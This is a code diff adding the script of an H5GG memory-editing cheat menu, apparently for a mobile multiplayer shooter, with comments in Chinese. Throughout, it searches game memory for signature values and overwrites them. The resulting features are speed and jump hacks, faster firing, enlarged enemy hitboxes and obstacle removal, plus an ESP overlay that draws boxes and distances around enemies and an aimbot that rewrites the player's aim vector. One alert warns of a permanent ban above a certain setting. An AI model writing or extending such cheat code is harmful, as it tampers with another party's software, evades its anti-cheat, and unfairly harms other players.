+									h5gg.setValue(zawsz[i],'0.24', 'F32');
+									document.getElementById("check6").checked = false;
+									qczawpd2 = false;
+								}
+							}else{
+								for(i = 0;i<zawsl;i++){
+									h5gg.setValue(zawsz[i],'9999999999', 'F32');
+									document.getElementById("check6").checked = true;
+									qczawpd2 = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索去除障碍物');
+							document.getElementById("check6").checked = false;
+						}
+					}
+					function sdgd(){
+						if(zqkgaa){	
+							if(sdgdpd){
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i] - 56,'-9.8', 'F32');
+									document.getElementById("check7").checked = false;
+									sdgdpd = false;
+								}
+							}else{
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i] - 56,'0', 'F32');
+									document.getElementById("check7").checked = true;
+									sdgdpd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索转圈');
+							document.getElementById("check7").checked = false;
+						}
+					}
+					function ydst(){
+						if(zqkgaa){	
+							if(ydstpd){
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i] - 56,'-9.8', 'F32');
+									document.getElementById("check21").checked = false;
+									ydstpd = false;
+								}
+							}else{
+								for(i = 0;i<qd;i++){
+									h5gg.setValue(zqjg2[i] - 56,'10', 'F32');
+									document.getElementById("check21").checked = true;
+									ydstpd = true;
+								}
+							}
+						}else{
+							alert('你还没有预搜索转圈');
+							document.getElementById("check21").checked = false;
+						}
+					}
+
+				function fx1(){
+					if(xjiabl){
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = false;
+						xjiabl = false;
+						document.getElementById("checkxzj").checked = false;
+					}else{
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = true;
+						xzbhjan = false;
+						xjiabl = true;
+						document.getElementById("checkxzj").checked = true;
+						document.getElementById("checkxjs").checked = false;	
+						document.getElementById("checkyzj").checked = false;
+						document.getElementById("checkyjs").checked = false;
+					}
+				}
+
+
+				function fx2(){
+					if(xjianbl){
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = false;
+						xjianbl = false;
+						document.getElementById("checkxjs").checked = false;
+					}else{
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = true;
+						xjianbl = true;
+						document.getElementById("checkxjs").checked = true;
+						document.getElementById("checkxzj").checked = false;
+						document.getElementById("checkyzj").checked = false;
+						document.getElementById("checkyjs").checked = false;
+					}
+				}
+
+				function fx3(){
+					if(yjiabl){
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = false;
+						yjiabl = false;
+						document.getElementById("checkyzj").checked = false;
+					}else{
+						yzbhjia = true;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = false;
+						yjiabl = true;
+						document.getElementById("checkyzj").checked = true;
+						document.getElementById("checkxzj").checked = false;
+						document.getElementById("checkxjs").checked = false;
+						document.getElementById("checkyjs").checked = false;
+						
+					}
+				}
+
+				function fx4(){
+					if(yjianbl){
+						yzbhjia = false;
+						yzbhjan = false;
+						xzbhjia = false;
+						xzbhjan = false;
+						yjianbl = false;
+						document.getElementById("checkyjs").checked = false;
+					}else{
+						yzbhjia = false;
+						yzbhjan = true;
+						xzbhjia = false;
+						xzbhjan = false;
+						yjianbl = true;
+						document.getElementById("checkyjs").checked = true;
+						document.getElementById("checkxzj").checked = false;
+						document.getElementById("checkxjs").checked = false;	
+						document.getElementById("checkyzj").checked = false;
+					}
+				}
+					
+					function fsdfsdf(){
+						if(qpzz){
+							qpzz = false;
+						}else{
+							qpzz = true;
+						}
+					}
+
+					
+					
+					
+				</script>
+			</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+	<script>
+
+
+
+		var pingmux = window.screen.height / 2; 
+		var pingmuy = window.screen.width / 2; 
+		sxwz = pingmuy / 4;
+		var kgaa = 0;
+		var ahjsg = false;
+		var zszbx = 0;
+		var zszby = 0;
+		var zszbz = 0;
+		var aasddd = 0;
+		jg = 8500;
+		h5gg.clearResults();
+		rwjz = new Array();
+		rwjz[0] = new Array();
+		rwjz[1] = new Array();
+		rwjz[2] = new Array();
+		rwjz[3] = new Array();
+		fkleft = 0;
+		fktop = 0;
+		fkright = 0;
+		fkbottom = 0;
+		aacc2 = {};
+		aacc = {};
+		xjz1 = parseFloat(0.0);
+		xjx0 = parseFloat(0.0);
+		xjy0 = parseFloat(0.0);
+		xjx1 = parseFloat(0.0);
+		xjy1 = parseFloat(0.0);
+		ddss = 0;
+		xjyjg2 = 0;
+		lt = 0;
+		paoajgsz = {};
+		ltdz = {};
+		jsjg = {};
+		shesudzag = {};
+		jasu2 = 0;
+		bljs = 0;
+		tygd2 = {};
+		tysl = 0;
+		tysl2 = 0;
+		f = 0;
+		zqjg = {};
+		zqjg2 = {};
+		zawsl = 0;
+		zawsz = {};
+		zszbdz = 0;
+		dedltaX = 0.0;
+		dedltaY = 0.0;
+		dedltaZ = 0.0;
+		
+		jdx = 0.0;
+		jdy = 0.0;
+		jdz = 0.0;
+		ahgsh = 0;
+		aeds = 0;
+		gdpc = 0.4;
+		zmfwaaaaaa = 100;
+		bhaa = 0;
+		bhdm = {};
+		pbsl = 0;
+		shesudza = {};
+		ssszsl = 0;
+		suojiadx = 0.0;
+		suotoudx = 0.0;
+		stdx = 0.0;
+		sjdx = 0.0;
+		gbdx = 0.0;
+		tousl = 0;
+		jiasl = 0;
+		gbsldx = 0;
+		sssza = 0.0;
+		sszv = false;
+		shesupd = false;
+		bhxs = false;
+		xszs = false;
+		jiasupd = false;
+		gtpd = false;
+		sdgdpd = false;
+		paoapd = false;
+		ltpd = false;
+		pahspd = false;
+		lthspd = false;
+		jshspd = false;
+		gthspd = false;
+		zdss = false;
+		zsypd = false;
+		sxkg = true;
+		xsfk = true;
+		jlxspda = false;
+		zqkgaa = false;	
+		zqkga2 = false;	
+		smmspd = false;
+		qczawpd1 = false;
+		qczawpd2 = false;
+		jmzmkg = false;
+		sxkg2 = true;
+		qpzz = false;
+		pzaqbl = false;
+		sckqpd = false;
+		mspd = false;
+		jiuwpd = false;
+		augpd = false;
+		lingwupd = false;
+		mk5pd = false;
+		uzipd = false;
+		awmpd = false;
+		m24pd = false;
+		babapd = false;
+		m18pd = false;
+		ydstpd = false;
+		fdaflt = true;
+		yzbhjia = false;
+		yzbhjan = false;
+		xzbhjia = false;
+		xzbhjan = false;
+		yjianbl = false;
+		xjianbl = false;
+		yjiabl = false;
+		xjiabl = false;
+                zhidaou = false;
+                nbj = 1;
+
+
+	        dodo = 0;
+	        doued = 0;
+                tnk = true;     
+                gif = 1;
+                hn = 0;
+                logs = document.getElementById('log');
+                slog = document.getElementById('sllog');
+                var menu = document.querySelector("#hmini");
+                menu.style.display='none';
+                var menu = document.querySelector("#mnlog");
+                menu.style.display='none';
+                var menu = document.querySelector("#silog");
+                menu.style.display='none';
+                var menu = document.querySelector("#hidd");
+                menu.style.display='block';
+                function minigui() {
+                         var menu = document.querySelector("#hmini");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+			 } else {
+				 menu.style.display='none';
+			 }
+                }
+                function minilog() {
+                         var menu = document.querySelector("#mnlog");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+			 } else {
+				 menu.style.display='none';
+			 }
+                }
+                function hider() {
+                         var menu = document.querySelector("#hidd");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+			 } else {
+				 menu.style.display='none';
+			 }
+                }
+                function kaihatu() {
+                         var menu = document.querySelector("#silog");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+			 } else {
+				 menu.style.display='none';
+			 }
+                }
+                const sleep = ms => new Promise(res => setTimeout(res, ms))
+                async function refl() {
+                setWindowRect(0, 0, 0, 0);
+                await sleep(2000)
+                setWindowRect(0, 0, window.screen.height, window.screen.width);
+                }
+
+ 
+
+
+		document.body.addEventListener('touchstart', function () {});
+			
+		
+		var sWidth = window.screen.width; 
+		var sHeight = window.screen.height; 
+		
+		
+		if (window.screen.availWidth > window.screen.availHeight) {
+			sWidth = window.screen.height;
+			sHeight = window.screen.width;
+		}
+		setWindowRect(0, 0, window.screen.height, window.screen.width);
+		
+		setButtonAction(function(){
+				
+			 var menu = document.querySelector("#H5AlertView");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+				 setWindowTouch(true);
+			 } else {
+				 menu.style.display='none';
+				 setWindowTouch(false);
+			 }
+		});//*/
+     
+     
+
+		setButtonAction(function(){
+				
+			 var menu = document.querySelector("#hmini");
+			 if(menu.style.display=='none') {
+				 menu.style.display='block';
+				 setWindowTouch(true);
+			 } else {
+				 menu.style.display='none';
+				 setWindowTouch(false);
+			 }
+		});//*/
+		var iosScale = window.devicePixelRatio;
+		
+		var canvasDom = document.createElement("canvas");
+		canvasDom.style.height = "100%";
+		canvasDom.style.width = "100%";
+		canvasDom.width = sWidth * iosScale;
+		canvasDom.height = sHeight * iosScale;
+		document.body.appendChild(canvasDom);
+		var ctx = canvasDom.getContext('2d');
+		setLineWidth(iosScale);
+		var fontFamily = " Arial";
+		
+		var cacheTimer = null;
+		var drawTimer = null;
+		var actorCache = []; 
+		
+		var baseAddr = Number(h5gg.getRangesList(0)[0].start); 
+		var GWorld = 0; 
+		drx = 0;
+		dry = 0;
+		
+		drz = 0;
+		rgb = 0;
+		rgb2 = '';
+		czz = {};
+		bpdsz = {}; 
+		asdsdd = false;
+		assdd = 0;
+		fkzj = 0;
+		
+		
+		function shuzpx(shuzu,xiab){
+			var csza = shuzu[0];
+			zxzz = 0;
+			szad = 0;
+			for(gk = 0;gk < xiab;gk++){
+				if(csza > shuzu[gk]){
+					csza = shuzu[gk];
+				}
+			}
+			zmfwaaaaaa = csza;
+			for(xhcs = 0;xhcs < fg;xhcs++){
+				if(csza == dxpx[xhcs]){
+					zxzz = xszpd[xhcs];
+					szad = xhcs;
+					break;
+				}
+			}
+			return 0;//异常
+		}
+		
+		
+		
+		function shadowDraw(){
+			fg = 0;
+			gdfgdfg = 0;
+			dxpx = {};
+			xszpd = {};
+			
+			leftfk = [];
+			topfk = [];
+			rightfk = [];
+			bottomfk = [];
+			if(smmspd){
+				rgb = rgb + 1;
+				if(rgb == 50){
+					rgb2 = "#00FF00"
+					rgb = 0;
+				}
+				if(rgb == 40){
+					rgb2 = "#483D8B"
+				}
+				if(rgb == 30){
+					rgb2 = "#FFC0CB"
+				}
+				if(rgb == 20){
+					rgb2 = "#DC143C"
+				}
+				if(rgb == 10){
+					rgb2 = 	"#800080"
+				}
+			}else{
+				rgb2 = "#ff9cff"
+			}
+			clearCtx();
+			rwjz[0][0] = h5gg.getValue(Number(aacc2),'F32');
+			rwjz[0][2] = h5gg.getValue(Number(aacc2) + 8,'F32');
+			rwjz[0][3] = h5gg.getValue(Number(aacc2) + 12,'F32');
+			rwjz[1][0] = h5gg.getValue(Number(aacc2) + 16,'F32');
+			rwjz[1][1] = h5gg.getValue(Number(aacc2) + 20,'F32');
+			rwjz[1][2] = h5gg.getValue(Number(aacc2) + 24,'F32');
+			rwjz[1][3] = h5gg.getValue(Number(aacc2) + 28,'F32');
+			rwjz[3][0] = h5gg.getValue(Number(aacc2) + 48,'F32');
+			rwjz[3][1] = h5gg.getValue(Number(aacc2) + 52,'F32');
+			rwjz[3][2] = h5gg.getValue(Number(aacc2) + 56,'F32');
+			rwjz[3][3] = h5gg.getValue(Number(aacc2) + 60,'F32');
+			for(i = 0;i<j;i++){
+				//aasddd = h5gg.getValue(aacc[i] - 12,'I32');
+				if(zszbdz != aacc[i]){
+					if(pbsl == 0){
+						asdsdd = true;
+					}else{
+						for(dsdd = 0;dsdd < pbsl;dsdd++){
+							if(bhdm[dsdd] == aacc[i]){
+								asdsdd = false;
+								break; 
+							}else{
+								asdsdd = true;
+							}
+							asdsdd = true;
+						}
+					}
+					if(asdsdd){
+					//if (aasddd != 0){
+						//if (aasddd != 1061997773){
+							//if (aasddd != 1065353216){
+								if (h5gg.getValue(Number(aacc[i]) - 32,'I32') == 1){
+								
+									drx = h5gg.getValue(aacc[i] - 12,'F32');//敌人X
+									dry = h5gg.getValue(aacc[i] - 8,'F32');//敌人Y
+									drz = h5gg.getValue(aacc[i] - 4,'F32');//敌人Z
+									if(qpzz){
+										gdfgdfg = aacc[i];
+									}
+									var view = rwjz[3][0] * drx + Number(rwjz[3][1]) * dry + Number(rwjz[3][2]) * drz + Number(rwjz[3][3]);
+									if(view >= 0.01){
+										view = 1 / view;
+										jss = Number(rwjz[1][0]) * drx;
+										jss2 = Number(rwjz[1][2]) * drz + Number(rwjz[1][3]);
+										xjx0 = Number(rwjz[0][0]) * drx + Number(rwjz [0][2]) * drz + Number(rwjz[0][3]);
+										xjy0 = jss + Number(rwjz [1][1]) * (Number(dry) + 1.8) + Number(jss2);
+										xjy1 = jss + Number(rwjz [1][1]) * (dry - 0.1) + Number(jss2);
+										xjx0 = xjx0 * view;
+										xjy0 = xjy0 * view;
+										xjy1 = xjy1 * view;
+										xjx0 = pingmux + Number(xjx0) * pingmux + 0.5;
+										xjy0 = pingmuy - Number(xjy0) * pingmuy - 0.5;
+										xjy1 = pingmuy - Number(xjy1) * pingmuy - 0.5;
+										xjyjg2 = xjy1 - xjy0;
+										ddss = xjyjg2 / 4;
+										fkleft = xjx0 - ddss;
+										fktop = xjy0;
+										fkright = xjx0 + Number(ddss);
+										fkbottom = xjy1;
+										
+										if(bhxs){
+											drawText("       " + i, fkright, fkbottom, 10, rgb2, true);
+										}
+										kfzxy = (fktop - fkbottom) / 2 + fkbottom;
+										kfzxx = (fkright - fkleft) / 2 + fkleft;
+										assdd = Math.sqrt((kfzxx - pingmux) * (kfzxx - pingmux) + Number((kfzxy - pingmuy) * (kfzxy - pingmuy))); 
+										if(jmzmkg){
+											drawCircle(pingmux,pingmuy,zmfwaaaaaa,"#00FF00",false);
+										}
+										if(zsypd){
+											xszpd[fg] = aacc[i];
+											dxpx[fg] = assdd;
+											leftfk[fg] = fkleft;
+											topfk[fg] = fktop;
+											rightfk[fg] = fkright;
+											bottomfk[fg] = fkbottom;
+											fg++;
+                                                                                        log.innerHTML = fg;
+									  	}else{
+											if(jmzmkg){
+												
+												
+												if(assdd < zmfwaaaaaa){
+													xszpd[fg] = aacc[i];
+													dxpx[fg] = assdd;
+													leftfk[fg] = fkleft;
+													topfk[fg] = fktop;
+													rightfk[fg] = fkright;
+													bottomfk[fg] = fkbottom;
+													fg++;
+												}
+												if(xsfk){
+													drawRect(fkleft,fktop,fkright - fkleft,fkbottom - fktop,rgb2, false);
+												}
+												if(sxkg){
+													drawLine(pingmux, sxwz,fkleft + Number((fkright - fkleft)) / 2, fktop ,rgb2);
+												}
+											}else{
+												if(xsfk){
+													drawRect(fkleft,fktop,fkright - fkleft,fkbottom - fktop,rgb2, false);
+												}
+												if(sxkg){
+													drawLine(pingmux, sxwz,fkleft + Number((fkright - fkleft)) / 2, fktop ,rgb2);
+												}
+											}
+										}
+
+										if(xsfk){
+											drawRect(fkleft,fktop,fkright - fkleft,fkbottom - fktop,rgb2, false);
+										}
+										fkzj = fkleft + Number((fkright - fkleft)) / 2;
+										if(sxkg){
+											drawLine(pingmux, sxwz,fkzj, fktop ,rgb2);
+										}
+										
+										juli = Math.floor(Math.sqrt(Number((zszbx - drx) * (zszbx - drx)) + Number((zszby - dry) * (zszby - dry)) + Number((zszbz - drz) * (zszbz - drz))));
+										if(pzaqbl){
+											if(juli < 130){
+												drawText("危险", fkzj, fktop, 10, "#F00", true);
+											}else{
+												drawText("安全", fkzj, fktop, 10, "#00FF00", true);
+											}
+										}
+										if(sxkg){
+											drawLine(pingmux, sxwz,fkleft + Number((fkright - fkleft)) / 2, fktop ,rgb2);
+										}
+										if(jlxspda){
+											drawText(juli + 'm', fkleft, fkbottom, 10, rgb2, true);
+										}
+									}
+								}
+							//}
+						//}
+					//}
+					}
+				}
+			}
+			if(jmzmkg){
+				if(j != 0){
+					shuzpx(dxpx,fg);
+					if(zxzz != 0){
+						for(aff = 0;aff < fdsfgg;aff++){
+							//if(qpzz){
+								//drx22 = h5gg.getValue(gdfgdfg - 12,'F32');
+								//dry22 = h5gg.getValue(gdfgdfg - 8,'F32');
+								//drz22 = h5gg.getValue(gdfgdfg - 4,'F32');
+								//dedltaX = h5gg.getValue(ahgsh,'F32') - drx22;
+								//dedltaY = h5gg.getValue(Number(ahgsh) + 4,'F32') - dry22 - dsaedw;
+								//dedltaZ = h5gg.getValue(Number(ahgsh) + 8,'F32') - drz22;
+								//hy = Math.sqrt(Number(dedltaX * dedltaX) + Number(dedltaZ * dedltaZ) + Number(dedltaY * dedltaY))
+								//h5gg.setValue(ahgsh - 12,dedltaX / hy, 'F32');
+								//h5gg.setValue(ahgsh - 8,dedltaY / hy, 'F32');
+								//h5gg.setValue(ahgsh - 4,dedltaZ / hy, 'F32');
+							//}else{
+								drx22 = h5gg.getValue(zxzz - 12,'F32');
+								dry22 = h5gg.getValue(zxzz - 8,'F32');
+								drz22 = h5gg.getValue(zxzz - 4,'F32');
+                                                                slog.innerHTML = "DryDone";
+								dedltaX = h5gg.getValue(ahgsh,'F32') - drx22;
+								dedltaY = h5gg.getValue(Number(ahgsh) + 4,'F32') - dry22 - dsaedw;
+								dedltaZ = h5gg.getValue(Number(ahgsh) + 8,'F32') - drz22;
+                                                                slog.innerHTML = "dedltaDone";
+								hy = Math.sqrt(Number(dedltaX * dedltaX) + Number(dedltaZ * dedltaZ) + Number(dedltaY * dedltaY))
+								h5gg.setValue(ahgsh - 12,dedltaX / hy, 'F32');
+								h5gg.setValue(ahgsh - 8,dedltaY / hy, 'F32');
+								h5gg.setValue(ahgsh - 4,dedltaZ / hy, 'F32');
+                                                                slog.innerHTML = "SetValueDone";
+							//}
+						}
+						if(sxkg2){
+							drawLine(pingmux, pingmuy,leftfk[szad] + Number((rightfk[szad] - leftfk[szad])) / 2, topfk[szad] ,"#00FF00");
+							drawRect(leftfk[szad],topfk[szad],rightfk[szad] - leftfk[szad],bottomfk[szad] - topfk[szad],"#00FF00", false);
+						}
+					}
+				}
+			}
+		}
+		
+		function clearCtx() {
+			ctx.clearRect(0, 0, canvasDom.width, canvasDom.height);
+		}
+		
+		
+		function setLineWidth(w) {
+			ctx.lineWidth = w;
+		}
+		
+		
+		function drawLine(x1, y1, x2, y2, color) {
+			x1 *= iosScale;
+			y1 *= iosScale;
+			x2 *= iosScale;
+			y2 *= iosScale;
+		
+			ctx.beginPath();
+			ctx.fillStyle = color;
+			ctx.strokeStyle = color;
+			ctx.moveTo(x1, y1);
+			ctx.lineTo(x2, y2);
+			ctx.stroke();
+			ctx.closePath();
+		}
+		
+		function drawCircle(x, y, r, color, isFill = true) {
+			x *= iosScale;
+			y *= iosScale;
+			r *= iosScale;
+		
+			ctx.beginPath();
+			ctx.strokeStyle = color;
+			ctx.fillStyle = color;
+			ctx.arc(x, y, r, 0, 2 * Math.PI);
+			if (isFill) {
+				ctx.fill();
+			} else {
+				ctx.stroke();
+			}
+			ctx.closePath();
+		}
+		
+		function drawRect(x, y, w, h, color, isFill = true) {
+			x *= iosScale;
+			y *= iosScale;
+			w *= iosScale;
+			h *= iosScale;
+		
+			ctx.beginPath();
+			ctx.strokeStyle = color;
+			ctx.fillStyle = color;
+			if (isFill) {
+				ctx.fillRect(x, y, w, h);
+			} else {
+				ctx.strokeRect(x, y, w, h);
+			}
+			ctx.closePath();
+		}
+		
+		function drawRoundRect(x, y, w, h, r, color, isFill = true) {
+			x *= iosScale;
+			y *= iosScale;
+			w *= iosScale;
+			h *= iosScale;
+			r *= iosScale;
+		
+			ctx.beginPath();
+			ctx.strokeStyle = color;
+			ctx.fillStyle = color;
+			if (w < 2 * r) r = w / 2;
+			if (h < 2 * r) r = h / 2;
+			ctx.beginPath();
+			ctx.moveTo(x + r, y);
+			ctx.arcTo(x + w, y, x + w, y + h, r);
+			ctx.arcTo(x + w, y + h, x, y + h, r);
+			ctx.arcTo(x, y + h, x, y, r);
+			ctx.arcTo(x, y, x + w, y, r);
+			if (isFill) {
+				ctx.fill();
+			} else {
+				ctx.stroke();
+			}
+			ctx.closePath();
+		}
+		
+		function drawText(text, x, y, size, color, isFill = true) {
+			x *= iosScale;
+			y *= iosScale;
+			size *= iosScale;
+		
+			ctx.beginPath();
+			ctx.textAlign = "center";
+			ctx.fillStyle = color;
+			ctx.strokeStyle = color;
+			ctx.font = size + 'px' + fontFamily;
+			if (isFill) {
+				ctx.fillText(text, x, y + size);
+			} else {
+				ctx.strokeText(text, x, y + size);
+			}
+			ctx.closePath();
+		};	
+		
+
+                setInterval(function(){
+
+			dodo = document.getElementById('doudou');
+			document.getElementById("ddo").innerHTML = dodo.value;
+			doued = Number(dodo.value);
+                }, 50);
+                setInterval(function(){
+                        logs.innerHTML = "";
+                        slog.innerHTML = "";
+                }, 6000);
+		
+		setInterval(function(){
+			aaaaa = document.getElementById('aaaaaaaa');
+			document.getElementById("para1").innerHTML = aaaaa.value;
+			
+			gtaaas = document.getElementById('gtaaa');
+			document.getElementById("para2").innerHTML = gtaaas.value;
+			
+			fwaa = document.getElementById('fanw');
+			document.getElementById("para3").innerHTML = fwaa.value;
+
+slider1.addEventListener('input',function () {
+rangevalue1.innerText = Number(slider1.value).toFixed(2);
+
+addr1 = readLong(baseAddr + 0x4bd0498)
+addr1 = readLong(addr1 + 0x100)
+addr1 = readLong(addr1 + 0x28)
+addr1 = (addr1 + 0x150)
+h5gg.setValue(addr1, Number(slider1.value), 'F32');
+});
+
+slider2.addEventListener('input',function () {
+rangevalue2.innerText = Number(slider2.value).toFixed(2);
+
+addr1 = readLong(baseAddr + 0x4bd0498)
+addr1 = readLong(addr1 + 0x210)
+addr1 = readLong(addr1 + 0x98)
+addr1 = readLong(addr1 + 0x150)
+addr1 = (addr1 + 0x150)
+h5gg.setValue(addr1, Number(slider2.value), 'F32');
+});
+			
+slider3.addEventListener('input',function () {
+rangevalue3.innerText = Number(slider3.value).toFixed(2);
+
+addr1 = readLong(baseAddr + 0x4497f50)
+addr1 = (addr1 + 0x2fc)
+h5gg.setValue(addr1, Number(slider3.value), 'F32');
+
+addr1 = readLong(baseAddr + 0x4497510)
+addr1 = (addr1 + 0x2fc)
+h5gg.setValue(addr1, Number(slider3.value), 'F32');
+
+addr1 = readLong(baseAddr + 0x4497ad0)
+addr1 = (addr1 + 0x2fc)
+h5gg.setValue(addr1, Number(slider3.value), 'F32');
+});
+
+			
+			fdsfg = document.getElementById('xhcsdd');
+			document.getElementById("para7").innerHTML = fdsfg.value;
+			fdsfgg = Number(fdsfg.value);
+			
+			
+			
+			
+			
+			
+			dsdsdff = document.getElementById('fsdfydsd');
+			document.getElementById("para9").innerHTML = dsdsdff.value;
+			dggdd = Number(dsdsdff.value);
+			
+
+
+
+
+
+			touasd = document.getElementById('suotou');
+			document.getElementById("paratou").innerHTML = touasd.value;
+			dggdd = Number(touasd.value);
+			
+			jiasdf = document.getElementById('suojia');
+			document.getElementById("parati").innerHTML = jiasdf.value;
+			dggddss = Number(jiasdf.value);
+
+
+
+
+
+			ssaadd = document.getElementById('shesuaf');
+			document.getElementById("para8").innerHTML = ssaadd.value;
+			sssza = Number(ssaadd.value);
+
+
+
+
+			xstdx = document.getElementById('touaaaa');
+			document.getElementById("paratouaa").innerHTML = xstdx.value;
+			xstdxa = Number(xstdx.value);
+			
+			xsjdx = document.getElementById('jiaaaaa');
+			document.getElementById("parajiaaa").innerHTML = xsjdx.value;
+			xsjdxa = Number(xsjdx.value);
+			
+			
+			xsgbdx = document.getElementById('geboaaaa');
+			document.getElementById("parageboaa").innerHTML = xsgbdx.value;
+			xsgbdxa = Number(xsgbdx.value);
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+		}, 100);
+		
+		
+		
+
+		
+		
+		
+		
+			
+
+			
+			
+		function yuss(){
+			jiasuaayss();
+			gaotiaoyss();
+			liantiaoyss();
+			shesu();
+			alert('预搜索完毕');
+		}
+			
+		function paoayss(){                  //跑A
+			h5gg.clearResults();
+			h5gg.searchNumber('6.25','F64', '0x100000000', '0x180000000');
+			if(h5gg.getResultsCount() == 0){
+				alert('未搜索到任何结果');
+			}else{
+				h5gg.searchNearby('1.6', 'F64', '0x300');
+				if(h5gg.getResultsCount() == 0){
+					alert('失败');
+				}else{
+					h5gg.searchNumber('1.6', 'F64', '0x100000000', '0x180000000');
+					var paoayssjgsl = h5gg.getResultsCount();
+					var paoayssjg = h5gg.getResults(paoayssjgsl);
+					for(i = 0;i<paoayssjgsl;i++){
+						paoapd = true;
+						paoajgsz[f] = paoayssjg[i].address;
+						f++;
+					}
+				}
+			}
+			h5gg.clearResults();
+			alert('跑A');
+		}
+			
+			function shesu(){
+				h5gg.clearResults();
+				h5gg.searchNumber('4587366580439587226','I64', '0x100000000', '0x180000000');
+				var shesuff = h5gg.getResultsCount();
+				var sssz = h5gg.getResults(shesuff);
+				for(i = 0;i<shesuff;i++){
+					if(h5gg.getValue(Number(sssz[i].address) + 24,'I64') == 4636737291354636288){
+						if(h5gg.getValue(Number(sssz[i].address) + 72,'I64') == 4607182418800017408){
+							if(h5gg.getValue(Number(sssz[i].address) - 48,'I64') == 4602678819172646912){
+								shesupd = true;
+								shesudzag[ssszsl] = Number(sssz[i].address) + 72;
+								ssszsl++;
+							}
+						}
+					}
+				}
+				h5gg.clearResults();
+				alert('射速' + ssszsl);
+			}
+		function liantiaoyss(){              //连跳
+			h5gg.clearResults();
+			h5gg.searchNumber('1057803469','I32', '0x100000000', '0x180000000');
+			var ltsl2 = h5gg.getResultsCount();
+			var ltjg = h5gg.getResults(ltsl2);
+			for(i = 0;i<ltsl2;i++){
+				if(h5gg.getValue(ltjg[i].address - 8,'I32') == 1112014848){
+					if(h5gg.getValue(Number(ltjg[i].address) + 8,'I32') == 1045220557){
+						ltpd = true;
+						ltdz[lt]=ltjg[i].address;
+						lt++;
+					}
+				}
+			}
+			h5gg.clearResults();
+			alert('连跳');
+		}
+		function jiasuaayss(){                  //加速
+			h5gg.clearResults();
+
+			h5gg.searchNumber('-0.01','F64', '0x100000000', '0x180000000');
+			var jasu2 = h5gg.getResultsCount();
+			var jasu = h5gg.getResults(jasu2);
+			for(i = 0;i<jasu2;i++){
+				if(h5gg.getValue(Number(jasu[i].address) - 24,'I64') == 4576918229304087675){
+					if(h5gg.getValue(Number(jasu[i].address) - 48,'I64') == 4609434218613702656){
+						if(h5gg.getValue(Number(jasu[i].address) - 72,'I64') == 4617315517961601024){
+							jiasupd = true;
+							jsjg[bljs] = Number(jasu[i].address) - 96;
+							bljs++;
+						}
+					}
+				}
+			}
+			h5gg.clearResults();
+			alert('加速');
+		}
+		function gaotiaoyss(){                 //高跳
+
+			h5gg.searchNumber('4616639978017495450','I64', '0x100000000', '0x180000000');
+			var tysl = h5gg.getResultsCount();
+			var tygd = h5gg.getResults(tysl);
+			for(i = 0;i<tysl;i++){
+				if(h5gg.getValue(Number(tygd[i].address) + 24,'I64') == 4615514078110652826){
+					if(h5gg.getValue(Number(tygd[i].address) + 48,'I64') == 4591870180066957722){
+						gtpd = true;
+						tygd2[tysl2] = Number(tygd[i].address) + 48;
+						tysl2++;
+					}
+				}
+			}
+			h5gg.clearResults();
+			alert('高跳');
+		}
+		
+		function sddj() {
+			h5gg.clearResults();
+			var hk0 = 0.22;
+			jiadza = [];
+			var hk1 = 1;
+			var hk2 = 0;
+			jiasl = 0;
+			var hk3 = dggddss;
+			sjdx = dggddss;
+			if(hk3 == 0){
+				hk3 = 0.7;
+			}
+
+        h5gg.searchNumber('0.22', 'F32', '0x280000000', '0x300000000');
+        var count = h5gg.getResultsCount();
+        var r = h5gg.getResults(count);
+        var cnt = 0;
+        for(var i=0; i<count; i++) {
+            var addr1 = r[i].address;
+            var shuzhi1 = h5gg.getValue((Number(addr1) + 16), "F32");
+            var shuzhi2 = h5gg.getValue((Number(addr1) + -28), "I32");
+if(
+shuzhi1 == 1 &&
+shuzhi2 == 1
+) 
+{
+h5gg.setValue(addr1,hk3, "F32");
+           
+           }
+      }
+			alert('范围甲');
+		}
+		function xiong(){
+			gbdzsz = [];
+			gbsldx = 0;
+			h5gg.clearResults();
+			h5gg.searchNumber(0.04, 'F32', '0x280000000', '0x300000000');
+			h5gg.searchNearby(1, 'F32', '0x10');
+			h5gg.searchNumber(0.04, 'F32', '0x280000000', '0x300000000');
+			var count = h5gg.getResultsCount();
+			var r = h5gg.getResults(count);
+			gbdx = fwaa.value;
+			if(fwaa.value > 0.6){
+				alert('超过0.6可能有永久封禁的风险');
+			}
+			for(var i=0; i<count; i++) {
+				var addr1 = r[i].address;
+				var dizhi41 = (Number(addr1) + 16);
+				var shuzhi1 = h5gg.getValue(dizhi41, "I32");
+				var addr2 = r[i].address;
+				var dizhi2 = (addr2 - 28);
+				var shuzhi2 = h5gg.getValue(dizhi2, "I32");
+				var addr3 = r[i].address;
+				var dizhi3 = (Number(addr3) + 4);
+				var shuzhi3 = h5gg.getValue(dizhi3, "I64");
+				if(shuzhi1 == '1065353216',shuzhi2 == '1',shuzhi3 == '0'){
+					h5gg.setValue(addr1,fwaa.value, "F32");
+					gbdzsz = addr1;
+					gbsldx++;
+				}
+			}
+			alert('范围胳膊');
+		}
+		function ssqczaw(){
+			zawsl = 0;
+			zawsz = {};
+			h5gg.clearResults();
+			h5gg.searchNumber('4500717323134435328','I64', '0x100000000', '0x180000000');
+			var azazaza = h5gg.getResultsCount();
+			var sdsdf = h5gg.getResults(azazaza);
+			for(i = 0;i<azazaza;i++){
+				if(h5gg.getValue(sdsdf[i].address - 4,'I32') == 1056904576){
+						qczawpd1 = true;
